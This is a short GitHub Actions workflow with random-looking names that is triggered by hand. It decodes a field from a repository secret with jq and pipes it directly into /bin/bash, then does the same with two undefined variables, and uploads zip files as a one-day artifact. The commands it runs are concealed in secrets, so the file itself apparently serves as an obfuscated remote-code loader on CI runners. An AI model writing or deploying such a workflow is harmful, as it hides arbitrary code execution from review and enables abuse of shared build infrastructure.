name: margaretistioj173
on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: margaretistioj173
        env:
          k1: ${{ secrets.k1 }}
        run: |
          printf '%s' "$k1" | jq -r .tc4652 | /bin/bash
          echo $nt951 | jq -r .rlwp7253 | /bin/bash
          echo $fluh898 | jq -r .zufs7884 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: E8qRAdUm
          path: "*.zip"
          retention-days: 1
